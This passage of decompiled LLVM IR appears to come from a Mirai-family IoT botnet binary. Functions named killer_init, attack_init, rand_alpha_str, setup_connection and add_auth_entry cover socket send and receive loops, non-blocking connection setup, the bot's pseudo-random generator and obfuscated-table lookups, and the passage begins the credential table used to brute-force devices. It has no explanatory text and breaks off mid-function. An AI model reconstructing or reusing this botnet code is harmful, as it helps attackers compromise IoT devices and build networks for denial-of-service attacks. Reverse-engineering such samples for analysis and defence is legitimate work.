  %v4_e030 = call i32 @__libc_send(i32 %v2_e02c, i32 ptrtoint (i32* @global_var_18fe0.113 to i32), i32 %v0_e028, i32 16384)
  store i32 1, i32* %r2.global-to-local, align 4
  %v2_e03c = load i32, i32* @global_var_21740.105, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_e048 = call i32 @__libc_send(i32 %v2_e03c, i32 %v2_dfbc, i32 1, i32 16384)
  %v3_e04c = load i8*, i8** %stack_var_-42, align 4
  %v4_e04c = ptrtoint i8* %v3_e04c to i32
  store i32 %v4_e04c, i32* %r2.global-to-local, align 4
  %v3_e050 = icmp eq i8* %v3_e04c, null
  br i1 %v3_e050, label %dec_label_pc_dbd0, label %dec_label_pc_e058

dec_label_pc_e058:                                ; preds = %dec_label_pc_e004
  %v2_e05c = load i32, i32* @global_var_21740.105, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v5_e068 = call i32 @__libc_send(i32 %v2_e05c, i32 %v2_da0c, i32 %v4_e04c, i32 16384)
  br label %dec_label_pc_dbd0

dec_label_pc_e070:                                ; preds = %dec_label_pc_de18
  %v2_e074 = load i32, i32* @global_var_21740.105, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v1_e080 = add i32 %v4_de1c, 16384
  store i32 %v1_e080, i32* %r3.global-to-local, align 4
  %v4_e084 = call i32 @__libc_recv(i32 %v2_e074, i32 %v2_dfbc, i32 2, i32 %v1_e080)
  br label %dec_label_pc_dbd0

dec_label_pc_e08c:                                ; preds = %dec_label_pc_de28
  %v2_e08c = load i32, i32* @global_var_21740.105, align 4
  %v1_e090 = call i32 @__GI___libc_close(i32 %v2_e08c)
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_e098 = load i32, i32* @r8, align 4
  %v2_e098 = inttoptr i32 %v1_e098 to i32*
  store i32 -1, i32* %v2_e098, align 4
  br label %dec_label_pc_dbd0

; uselistorder directives
  uselistorder i32 %v3_dedc, { 1, 3, 2, 0 }
  uselistorder i8* %v3_deb8, { 1, 0 }
  uselistorder i32 %v5_de94, { 1, 0, 2, 3 }
  uselistorder i32 %v7_de58, { 1, 0 }
  uselistorder i32 %v5_de30, { 1, 0, 3, 2 }
  uselistorder i32 %v4_de1c, { 2, 0, 1, 3 }
  uselistorder i32 %v4_de04, { 1, 0 }
  uselistorder i32 %v2_dda0, { 6, 3, 2, 0, 1, 5, 4 }
  uselistorder i32 %v5_dce4, { 1, 0, 2 }
  uselistorder i32 %v2_dce0, { 2, 0, 1 }
  uselistorder i32 %v5_dcc8, { 1, 2, 0 }
  uselistorder i32 %v2_dc0c, { 2, 1, 0 }
  uselistorder i32 %v1_dc00, { 1, 2, 0 }
  uselistorder i32 %v1_dbe4, { 1, 2, 0 }
  uselistorder i32 %v2_dfbc, { 3, 0, 4, 2, 1 }
  uselistorder i32 %v2_dcf4, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v2_dbcc, { 1, 0, 2 }
  uselistorder i32 %v2_da68, { 0, 10, 1, 11, 2, 9, 3, 4, 8, 7, 5, 12, 6 }
  uselistorder i32 %v2_da50, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32 %v2_d978, { 1, 0, 2 }
  uselistorder i32* %stack_var_-64, { 1, 0, 2 }
  uselistorder i32* %stack_var_-136, { 1, 0, 2 }
  uselistorder i32* %stack_var_-48, { 1, 0, 2 }
  uselistorder i8** %stack_var_-42, { 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 20, 19, 21, 22, 23, 24, 25, 26, 27, 28 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 5, 6, 7, 3, 4, 8, 9 }
  uselistorder i8* null, { 2, 0, 1 }
  uselistorder i32 16386, { 0, 2, 1, 3 }
  uselistorder i32 (i32)* @sleep, { 9, 8, 7, 5, 6, 4, 3, 2, 1, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_218c0.107 to i32), { 2, 1, 0 }
  uselistorder i8* bitcast (i8** @global_var_218c0.107 to i8*), { 0, 1, 3, 2 }
  uselistorder i32* @global_var_21740.105, { 1, 2, 3, 4, 5, 0, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17 }
  uselistorder i32* @global_var_2173c.83, { 1, 2, 3, 4, 5, 6, 7, 0, 8 }
  uselistorder i32 (i32)* @killer_init, { 1, 0 }
  uselistorder i32 (i32)* @attack_init, { 1, 0 }
  uselistorder i32 (i32, i32)* @rand_alpha_str, { 2, 1, 0 }
  uselistorder i32* @global_var_21744.81, { 2, 0, 3, 1 }
  uselistorder i32 ptrtoint (i32* @global_var_d834.79 to i32), { 0, 2, 1 }
  uselistorder i32 ptrtoint (i16** @global_var_243dc.90 to i32), { 0, 1, 3, 2 }
  uselistorder i32 (i32, i32)* @bsd_signal, { 1, 0 }
  uselistorder label %bb44, { 1, 0 }
  uselistorder label %dec_label_pc_dd08, { 2, 1, 0 }
  uselistorder label %bb42, { 1, 0 }
  uselistorder label %dec_label_pc_dc50, { 2, 0, 1 }
  uselistorder label %dec_label_pc_dc40, { 1, 0 }
  uselistorder label %dec_label_pc_dbd0, { 7, 8, 9, 1, 10, 2, 0, 11, 12, 3, 4, 5, 13, 6, 14 }
  uselistorder label %dec_label_pc_da20, { 2, 0, 1 }
}

define i32 @function_e0c8(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_e0c8:
  %v0_e0c8 = load i1, i1* @cpsr_c, align 1
  call void @__pseudo_cond_branch(i1 %v0_e0c8, i32 -22312068)
  %v0_e0d0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_e0d0, label %bb, label %bb1

bb:                                               ; preds = %dec_label_pc_e0c8
  br label %bb1

bb1:                                              ; preds = %dec_label_pc_e0c8, %bb
  ret i32 %arg1

; uselistorder directives
  uselistorder label %bb1, { 1, 0 }
}

define i32 @rand_next() local_unnamed_addr {
entry:
  %v2_e0e0 = load i32, i32* @global_var_218c4.115, align 4
  %v2_e0e4 = load i32, i32* @global_var_218d0.117, align 4
  %v4_e0f0 = mul i32 %v2_e0e0, 2048
  %v5_e0f0 = xor i32 %v4_e0f0, %v2_e0e0
  store i32 %v5_e0f0, i32* @r3, align 4
  %v4_e0f4 = udiv i32 %v2_e0e4, 524288
  %v5_e0f4 = xor i32 %v4_e0f4, %v2_e0e4
  %v2_e0f8 = load i32, i32* @global_var_218c8.119, align 4
  %v2_e0fc = load i32, i32* @global_var_218cc.121, align 4
  %v2_e100 = xor i32 %v5_e0f4, %v5_e0f0
  %v4_e104 = udiv i32 %v5_e0f0, 256
  %v5_e104 = xor i32 %v2_e100, %v4_e104
  store i32 %v2_e0f8, i32* @global_var_218c4.115, align 4
  store i32 %v2_e0fc, i32* @global_var_218c8.119, align 4
  store i32 %v2_e0e4, i32* @global_var_218cc.121, align 4
  store i32 %v5_e104, i32* @global_var_218d0.117, align 4
  ret i32 %v5_e104

; uselistorder directives
  uselistorder i32 %v2_e0e4, { 2, 1, 0 }
  uselistorder i32 %v2_e0e0, { 1, 0 }
}

define i32 @rand_init(i32 %arg1) local_unnamed_addr {
entry:
  %v2_e13c = call i32 @__GI_time(i32* null)
  store i32 %v2_e13c, i32* @global_var_218c4.115, align 4
  %v1_e148 = call i32 @__getpid(i32 %v2_e13c)
  store i32 %v1_e148, i32* @r0, align 4
  %v0_e150 = call i32 @getppid()
  %v2_e158 = xor i32 %v1_e148, %v0_e150
  store i32 %v2_e158, i32* @global_var_218c8.119, align 4
  %v1_e160 = call i32 @clock(i32 %v2_e158)
  %v2_e164 = load i32, i32* @global_var_218c8.119, align 4
  %v2_e170 = xor i32 %v2_e164, %v1_e160
  store i32 %v2_e170, i32* @global_var_218d0.117, align 4
  store i32 %v1_e160, i32* @global_var_218cc.121, align 4
  ret i32 %v1_e160

; uselistorder directives
  uselistorder i32 %v1_e160, { 1, 2, 0 }
  uselistorder i32 ()* @getppid, { 2, 1, 0 }
  uselistorder i32 (i32)* @__getpid, { 2, 1, 0 }
}

define i32 @rand_alpha_str(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %v3_e198 = load i32, i32* @r4, align 4
  %v6_e198 = load i32, i32* @r5, align 4
  %v9_e198 = load i32, i32* @r6, align 4
  store i32 %arg1, i32* %fp.global-to-local, align 4
  store i32 %arg2, i32* %sb.global-to-local, align 4
  %v1_e1ac = call i32 @table_unlock_val(i32 28)
  %v3_e1b8 = call i32 @table_retrieve_val(i32 28, i32* null)
  store i32 %v3_e1b8, i32* @r1, align 4
  %v2_e1c4 = bitcast i32* %stack_var_-72 to i8*
  %v3_e1c4 = call i32 @strcpy(i8* %v2_e1c4, i32 %v3_e1b8)
  %v2_e1c8 = icmp eq i32 %arg2, 0
  br i1 %v2_e1c8, label %dec_label_pc_e244, label %dec_label_pc_e1d0

dec_label_pc_e1d0:                                ; preds = %entry
  store i32 ptrtoint (i32* @global_var_218c4.115 to i32), i32* %sl.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_218c8.119 to i32), i32* %r8.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_218cc.121 to i32), i32* %r7.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_218d0.117 to i32), i32* @r6, align 4
  store i32 0, i32* @r5, align 4
  %v2_e228 = ptrtoint i32* %stack_var_-40 to i32
  br label %dec_label_pc_e1e4

dec_label_pc_e1e4:                                ; preds = %dec_label_pc_e1e4.dec_label_pc_e1e4_crit_edge, %dec_label_pc_e1d0
  %v1_e208 = phi i32 [ %v1_e208.pre, %dec_label_pc_e1e4.dec_label_pc_e1e4_crit_edge ], [ ptrtoint (i32* @global_var_218c4.115 to i32), %dec_label_pc_e1d0 ]
  %v2_e1e4 = load i32, i32* @global_var_218d0.117, align 4
  store i32 %v2_e1e4, i32* %r2.global-to-local, align 4
  %v2_e1e8 = load i32, i32* @global_var_218c4.115, align 4
  %v4_e1ec = udiv i32 %v2_e1e4, 524288
  %v5_e1ec = xor i32 %v4_e1ec, %v2_e1e4
  %v4_e1f0 = mul i32 %v2_e1e8, 2048
  %v5_e1f0 = xor i32 %v4_e1f0, %v2_e1e8
  %v2_e1f4 = xor i32 %v5_e1ec, %v5_e1f0
  %v2_e1f8 = load i32, i32* @global_var_218c8.119, align 4
  %v2_e1fc = load i32, i32* @global_var_218cc.121, align 4
  store i32 %v2_e1fc, i32* %ip.global-to-local, align 4
  %v4_e200 = udiv i32 %v5_e1f0, 256
  %v5_e200 = xor i32 %v2_e1f4, %v4_e200
  store i32 %v5_e200, i32* @r4, align 4
  %v2_e208 = inttoptr i32 %v1_e208 to i32*
  store i32 %v2_e1f8, i32* %v2_e208, align 4
  %v0_e20c = load i32, i32* %ip.global-to-local, align 4
  %v1_e20c = load i32, i32* %r8.global-to-local, align 4
  %v2_e20c = inttoptr i32 %v1_e20c to i32*
  store i32 %v0_e20c, i32* %v2_e20c, align 4
  %v0_e210 = load i32, i32* %r2.global-to-local, align 4
  %v1_e210 = load i32, i32* %r7.global-to-local, align 4
  %v2_e210 = inttoptr i32 %v1_e210 to i32*
  store i32 %v0_e210, i32* %v2_e210, align 4
  %v0_e214 = load i32, i32* @r4, align 4
  %v1_e214 = load i32, i32* @r6, align 4
  %v2_e214 = inttoptr i32 %v1_e214 to i32*
  store i32 %v0_e214, i32* %v2_e214, align 4
  %v2_e218 = call i32 @util_strlen(i8* %v2_e1c4)
  %v0_e220 = load i32, i32* @r4, align 4
  %v3_e224 = urem i32 %v0_e220, %v2_e218
  %v2_e22c = add i32 %v3_e224, %v2_e228
  %v1_e230 = add i32 %v2_e22c, -32
  %v2_e230 = inttoptr i32 %v1_e230 to i8*
  %v3_e230 = load i8, i8* %v2_e230, align 1
  %v2_e234 = load i32, i32* @r5, align 4
  %v3_e234 = load i32, i32* %fp.global-to-local, align 4
  %v4_e234 = add i32 %v3_e234, %v2_e234
  %v5_e234 = inttoptr i32 %v4_e234 to i8*
  store i8 %v3_e230, i8* %v5_e234, align 1
  %v0_e238 = load i32, i32* @r5, align 4
  %v1_e238 = add i32 %v0_e238, 1
  store i32 %v1_e238, i32* @r5, align 4
  %v1_e23c = load i32, i32* %sb.global-to-local, align 4
  %v9_e23c = icmp eq i32 %v1_e238, %v1_e23c
  br i1 %v9_e23c, label %dec_label_pc_e244, label %dec_label_pc_e1e4.dec_label_pc_e1e4_crit_edge

dec_label_pc_e1e4.dec_label_pc_e1e4_crit_edge:    ; preds = %dec_label_pc_e1e4
  %v1_e208.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_e1e4

dec_label_pc_e244:                                ; preds = %dec_label_pc_e1e4, %entry
  %v1_e248 = call i32 @table_lock_val(i32 28)
  store i32 %v3_e198, i32* @r4, align 4
  store i32 %v6_e198, i32* @r5, align 4
  store i32 %v9_e198, i32* @r6, align 4
  ret i32 %v1_e248

; uselistorder directives
  uselistorder i32 %v2_e1e8, { 1, 0 }
  uselistorder i32 %v2_e1e4, { 1, 0, 2 }
}

define i32 @rand_str(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-28 = alloca i32, align 4
  %v0_e268 = load i32, i32* %r1.global-to-local, align 4
  %v3_e26c = load i32, i32* @r4, align 4
  store i32 %v3_e26c, i32* %stack_var_-28, align 4
  %v0_e270 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_e270, i32* %r5.global-to-local, align 4
  %tmp16 = icmp slt i32 %v0_e268, 1
  br i1 %tmp16, label %dec_label_pc_e318, label %dec_label_pc_e278

dec_label_pc_e278:                                ; preds = %entry
  store i32 ptrtoint (i32* @global_var_218d0.117 to i32), i32* %sl.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_218cc.121 to i32), i32* %r8.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_218c8.119 to i32), i32* %r7.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_218c4.115 to i32), i32* %r6.global-to-local, align 4
  %v2_e288 = load i32, i32* @global_var_218d0.117, align 4
  store i32 %v2_e288, i32* %lr.global-to-local, align 4
  %v2_e28c = load i32, i32* @global_var_218cc.121, align 4
  store i32 %v2_e28c, i32* %r4.global-to-local, align 4
  %v2_e290 = load i32, i32* @global_var_218c8.119, align 4
  store i32 %v2_e290, i32* %r0.global-to-local, align 4
  %v2_e294 = load i32, i32* @global_var_218c4.115, align 4
  br label %dec_label_pc_e2b8

dec_label_pc_e29c:                                ; preds = %dec_label_pc_e2d8
  %v1_e29c = trunc i32 %v5_e2c8 to i16
  %v3_e29c = inttoptr i32 %v9_e2cc to i16*
  store i16 %v1_e29c, i16* %v3_e29c, align 2
  %v4_e29c = load i32, i32* %r5.global-to-local, align 4
  %v5_e29c = add i32 %v4_e29c, -2
  store i32 %v5_e29c, i32* %r5.global-to-local, align 4
  %v0_e2a0.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_e2a0

dec_label_pc_e2a0:                                ; preds = %.thread, %dec_label_pc_e29c
  %v0_e2a0 = phi i32 [ %v9_e2d0, %.thread ], [ %v0_e2a0.pre, %dec_label_pc_e29c ]
  %v2_e29c5 = phi i32 [ %v12_e2cc, %.thread ], [ %v5_e29c, %dec_label_pc_e29c ]
  %tmp17 = icmp slt i32 %v0_e2a0, 1
  br i1 %tmp17, label %dec_label_pc_e320, label %dec_label_pc_e2ac

dec_label_pc_e2ac:                                ; preds = %dec_label_pc_e2a0
  %v0_e2a4 = load i32, i32* %r0.global-to-local, align 4
  %v0_e2ac = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_e2ac, i32* %r0.global-to-local, align 4
  %v0_e2b0 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v0_e2b0, i32* %r4.global-to-local, align 4
  %v0_e2b4 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_e2b4, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_e2b8

dec_label_pc_e2b8:                                ; preds = %dec_label_pc_e278, %dec_label_pc_e2ac
  %v0_e304 = phi i32 [ %v2_e290, %dec_label_pc_e278 ], [ %v0_e2ac, %dec_label_pc_e2ac ]
  %v9_e2cc = phi i32 [ %v0_e270, %dec_label_pc_e278 ], [ %v2_e29c5, %dec_label_pc_e2ac ]
  %v0_e2e4 = phi i32 [ %v0_e268, %dec_label_pc_e278 ], [ %v0_e2a0, %dec_label_pc_e2ac ]
  %v0_e2f8 = phi i32 [ %v2_e288, %dec_label_pc_e278 ], [ %v0_e2b4, %dec_label_pc_e2ac ]
  %v0_e2f4 = phi i32 [ %v2_e294, %dec_label_pc_e278 ], [ %v0_e2a4, %dec_label_pc_e2ac ]
  %v4_e2b8 = mul i32 %v0_e2f4, 2048
  %v5_e2b8 = xor i32 %v4_e2b8, %v0_e2f4
  %v4_e2bc = udiv i32 %v0_e2f8, 524288
  %v5_e2bc = xor i32 %v4_e2bc, %v0_e2f8
  %v2_e2c0 = xor i32 %v5_e2bc, %v5_e2b8
  %v4_e2c8 = udiv i32 %v5_e2b8, 256
  %v5_e2c8 = xor i32 %v2_e2c0, %v4_e2c8
  store i32 %v5_e2c8, i32* %r3.global-to-local, align 4
  %v7_e2cc = icmp sgt i32 %v0_e2e4, 3
  br i1 %v7_e2cc, label %.thread, label %dec_label_pc_e2d8

.thread:                                          ; preds = %dec_label_pc_e2b8
  %v10_e2cc = inttoptr i32 %v9_e2cc to i32*
  store i32 %v5_e2c8, i32* %v10_e2cc, align 4
  %v11_e2cc = load i32, i32* %r5.global-to-local, align 4
  %v12_e2cc = add i32 %v11_e2cc, 4
  store i32 %v12_e2cc, i32* %r5.global-to-local, align 4
  %v8_e2d0 = load i32, i32* %r1.global-to-local, align 4
  %v9_e2d0 = add i32 %v8_e2d0, -4
  store i32 %v9_e2d0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_e2a0

dec_label_pc_e2d8:                                ; preds = %dec_label_pc_e2b8
  %v7_e2e4 = icmp eq i32 %v0_e2e4, 1
  store i32 %v5_e2c8, i32* %r3.global-to-local, align 4
  %v1_e2ec = add i32 %v0_e2e4, -2
  store i32 %v1_e2ec, i32* %r1.global-to-local, align 4
  br i1 %v7_e2e4, label %dec_label_pc_e2f4, label %dec_label_pc_e29c

dec_label_pc_e2f4:                                ; preds = %dec_label_pc_e2d8
  store i32 %v5_e2c8, i32* %r3.global-to-local, align 4
  %v1_e304 = load i32, i32* %r6.global-to-local, align 4
  %v2_e304 = inttoptr i32 %v1_e304 to i32*
  store i32 %v0_e304, i32* %v2_e304, align 4
  %v0_e308 = load i32, i32* %r4.global-to-local, align 4
  %v1_e308 = load i32, i32* %r7.global-to-local, align 4
  %v2_e308 = inttoptr i32 %v1_e308 to i32*
  store i32 %v0_e308, i32* %v2_e308, align 4
  %v0_e30c = load i32, i32* %lr.global-to-local, align 4
  %v1_e30c = load i32, i32* %r8.global-to-local, align 4
  %v2_e30c = inttoptr i32 %v1_e30c to i32*
  store i32 %v0_e30c, i32* %v2_e30c, align 4
  %v0_e310 = load i32, i32* %r3.global-to-local, align 4
  %v1_e310 = load i32, i32* %sl.global-to-local, align 4
  %v2_e310 = inttoptr i32 %v1_e310 to i32*
  store i32 %v0_e310, i32* %v2_e310, align 4
  %v0_e314 = load i32, i32* %r3.global-to-local, align 4
  %v1_e314 = trunc i32 %v0_e314 to i8
  %v2_e314 = load i32, i32* %r5.global-to-local, align 4
  %v3_e314 = inttoptr i32 %v2_e314 to i8*
  store i8 %v1_e314, i8* %v3_e314, align 1
  br label %dec_label_pc_e318

dec_label_pc_e318:                                ; preds = %entry, %dec_label_pc_e320, %dec_label_pc_e2f4
  %v2_e318 = load i32, i32* %stack_var_-28, align 4
  store i32 %v2_e318, i32* @r4, align 4
  %v1_e31c = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_e31c

dec_label_pc_e320:                                ; preds = %dec_label_pc_e2a0
  %v0_e320 = load i32, i32* %r3.global-to-local, align 4
  %v1_e320 = load i32, i32* %sl.global-to-local, align 4
  %v2_e320 = inttoptr i32 %v1_e320 to i32*
  store i32 %v0_e320, i32* %v2_e320, align 4
  %v0_e324 = load i32, i32* %lr.global-to-local, align 4
  %v1_e324 = load i32, i32* %r8.global-to-local, align 4
  %v2_e324 = inttoptr i32 %v1_e324 to i32*
  store i32 %v0_e324, i32* %v2_e324, align 4
  %v0_e328 = load i32, i32* %r4.global-to-local, align 4
  %v1_e328 = load i32, i32* %r7.global-to-local, align 4
  %v2_e328 = inttoptr i32 %v1_e328 to i32*
  store i32 %v0_e328, i32* %v2_e328, align 4
  %v0_e32c = load i32, i32* %r0.global-to-local, align 4
  %v1_e32c = load i32, i32* %r6.global-to-local, align 4
  %v2_e32c = inttoptr i32 %v1_e32c to i32*
  store i32 %v0_e32c, i32* %v2_e32c, align 4
  br label %dec_label_pc_e318

; uselistorder directives
  uselistorder i32 %v9_e2d0, { 1, 0 }
  uselistorder i32 %v12_e2cc, { 1, 0 }
  uselistorder i32 %v5_e2c8, { 0, 2, 3, 4, 1 }
  uselistorder i32 %v0_e2f4, { 1, 0 }
  uselistorder i32 %v0_e2f8, { 1, 0 }
  uselistorder i32 %v0_e2e4, { 1, 0, 2 }
  uselistorder i32 %v0_e2a0, { 1, 0 }
  uselistorder i32 %v0_e268, { 1, 0 }
  uselistorder i32* %r5.global-to-local, { 2, 1, 4, 0, 3, 5 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 0, 3, 4 }
  uselistorder i32* %r3.global-to-local, { 4, 0, 1, 2, 3, 6, 5 }
  uselistorder i32* %r1.global-to-local, { 3, 5, 4, 2, 0, 1 }
  uselistorder i32* %r0.global-to-local, { 4, 3, 2, 5, 6, 0, 1 }
  uselistorder i32* %lr.global-to-local, { 1, 2, 0, 3, 4 }
  uselistorder i32* @global_var_218c4.115, { 2, 3, 5, 1, 0, 4 }
  uselistorder i32 ptrtoint (i32* @global_var_218c4.115 to i32), { 1, 0, 2 }
  uselistorder i32* @global_var_218c8.119, { 2, 3, 6, 4, 1, 0, 5 }
  uselistorder i32* @global_var_218cc.121, { 2, 3, 5, 1, 0, 4 }
  uselistorder i32* @global_var_218d0.117, { 2, 3, 5, 1, 0, 4 }
  uselistorder label %dec_label_pc_e318, { 1, 2, 0 }
  uselistorder label %dec_label_pc_e2b8, { 1, 0 }
}

define i32 @setup_connection() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_e344 = load i32, i32* @r4, align 4
  store i32 %v3_e344, i32* %stack_var_-16, align 4
  %v6_e344 = load i32, i32* @r5, align 4
  %v9_e344 = load i32, i32* @r6, align 4
  %v12_e344 = load i32, i32* @lr, align 4
  %v0_e348 = load i32, i32* @r0, align 4
  store i32 %v0_e348, i32* @r5, align 4
  %v1_e34c = add i32 %v0_e348, 4
  %v2_e34c = inttoptr i32 %v1_e34c to i32*
  %v3_e34c = load i32, i32* %v2_e34c, align 4
  store i32 %v3_e34c, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r6, align 4
  store i32 0, i32* %stack_var_-32, align 4
  store i32 58224, i32* @lr, align 4
  %v1_e36c = icmp ne i32 %v3_e34c, -1
  call void @__pseudo_cond_branch(i1 %v1_e36c, i32 ptrtoint (i32* @global_var_13fb0.109 to i32))
  store i32 2, i32* %r0.global-to-local, align 4
  %v0_e378 = load i32, i32* @r6, align 4
  store i32 %v0_e378, i32* %r2.global-to-local, align 4
  %v3_e37c = call i32 @socket(i32 2, i32 1, i32 %v0_e378)
  store i32 %v3_e37c, i32* %r0.global-to-local, align 4
  %v7_e380 = icmp eq i32 %v3_e37c, -1
  %v1_e384 = load i32, i32* @r5, align 4
  %v2_e384 = add i32 %v1_e384, 4
  %v3_e384 = inttoptr i32 %v2_e384 to i32*
  store i32 %v3_e37c, i32* %v3_e384, align 4
  br i1 %v7_e380, label %entry.dec_label_pc_e3fc_crit_edge, label %dec_label_pc_e38c

entry.dec_label_pc_e3fc_crit_edge:                ; preds = %entry
  %v1_e404.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_e3fc

dec_label_pc_e38c:                                ; preds = %entry
  %v2_e350 = ptrtoint i32* %stack_var_-32 to i32
  %v0_e38c = load i32, i32* @r5, align 4
  %v1_e38c = add i32 %v0_e38c, 28
  store i32 %v1_e38c, i32* @r0, align 4
  %v0_e390 = load i32, i32* @r6, align 4
  %v2_e390 = add i32 %v0_e38c, 24
  %v3_e390 = inttoptr i32 %v2_e390 to i32*
  store i32 %v0_e390, i32* %v3_e390, align 4
  store i32 256, i32* @r1, align 4
  %v0_e398 = call i32 @util_zero()
  store i32 %v0_e398, i32* %r0.global-to-local, align 4
  %v0_e39c = load i32, i32* @r5, align 4
  %v1_e39c = add i32 %v0_e39c, 4
  %v2_e39c = inttoptr i32 %v1_e39c to i32*
  %v3_e39c = load i32, i32* %v2_e39c, align 4
  store i32 %v3_e39c, i32* @r4, align 4
  %v0_e3a0 = load i32, i32* @r6, align 4
  store i32 %v0_e3a0, i32* @r2, align 4
  store i32 %v3_e39c, i32* %r0.global-to-local, align 4
  %v2_e3ac = call i32 @__libc_fcntl(i32 %v3_e39c, i32 3)
  %v1_e3b4 = or i32 %v2_e3ac, 2048
  store i32 %v1_e3b4, i32* @r2, align 4
  %v0_e3b8 = load i32, i32* @r4, align 4
  store i32 %v0_e3b8, i32* %r0.global-to-local, align 4
  %v2_e3bc = call i32 @__libc_fcntl(i32 %v0_e3b8, i32 4)
  store i32 %v2_e3bc, i32* %r0.global-to-local, align 4
  %v2_e3c4 = load i32, i32* @global_var_21908.135, align 4
  store i32 %v2_e3c4, i32* %r2.global-to-local, align 4
  %v1_e3cc = load i32, i32* @r5, align 4
  %v2_e3cc = add i32 %v1_e3cc, 12
  %v3_e3cc = inttoptr i32 %v2_e3cc to i32*
  store i32 1, i32* %v3_e3cc, align 4
  store i32 2, i32* %stack_var_-32, align 4
  %v0_e3d8 = load i32, i32* %r2.global-to-local, align 4
  %v1_e3d8 = load i32, i32* @r5, align 4
  %v2_e3d8 = add i32 %v1_e3d8, 8
  %v3_e3d8 = inttoptr i32 %v2_e3d8 to i32*
  store i32 %v0_e3d8, i32* %v3_e3d8, align 4
  %v0_e3dc = load i32, i32* @r5, align 4
  %v1_e3e0 = add i32 %v0_e3dc, 4
  %v2_e3e0 = inttoptr i32 %v1_e3e0 to i32*
  %v3_e3e0 = load i32, i32* %v2_e3e0, align 4
  store i32 %v3_e3e0, i32* %r0.global-to-local, align 4
  %v1_e3e4 = add i32 %v0_e3dc, 20
  %v2_e3e4 = inttoptr i32 %v1_e3e4 to i16*
  %v3_e3e4 = load i16, i16* %v2_e3e4, align 2
  %v4_e3e4 = zext i16 %v3_e3e4 to i32
  store i32 %v4_e3e4, i32* @r5, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_e3f8 = call i32 @__libc_connect(i32 %v3_e3e0, i32 %v2_e350, i32 16)
  store i32 %v3_e3f8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_e3fc

dec_label_pc_e3fc:                                ; preds = %entry.dec_label_pc_e3fc_crit_edge, %dec_label_pc_e38c
  %v1_e404 = phi i32 [ %v1_e404.pre, %entry.dec_label_pc_e3fc_crit_edge ], [ %v3_e3f8, %dec_label_pc_e38c ]
  %v2_e400 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_e400, i32* @r4, align 4
  store i32 %v6_e344, i32* @r5, align 4
  store i32 %v9_e344, i32* @r6, align 4
  store i32 %v12_e344, i32* @lr, align 4
  ret i32 %v1_e404

; uselistorder directives
  uselistorder i32 %v3_e37c, { 1, 0, 2 }
  uselistorder i32* %stack_var_-32, { 0, 2, 1 }
  uselistorder i32* %r0.global-to-local, { 1, 0, 3, 2, 4, 5, 8, 9, 7, 6 }
  uselistorder i32 ()* @util_zero, { 0, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_e3fc, { 1, 0 }
}

define i32 @add_auth_entry(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
